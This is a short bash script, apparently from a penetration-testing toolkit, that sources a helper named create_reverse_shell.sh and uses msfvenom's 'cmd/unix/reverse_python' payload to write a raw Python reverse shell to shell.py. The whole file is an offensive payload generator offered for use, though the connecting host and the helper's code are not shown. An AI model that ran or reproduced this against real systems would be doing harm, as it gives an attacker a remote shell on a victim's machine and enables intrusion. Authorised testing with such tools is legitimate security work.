#!/bin/bash

: '
Create Python file
'

source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"

payload="cmd/unix/reverse_python"
format="raw"
filename="shell.py"

create_reverse_shell "${payload}" "${format}" "${filename}"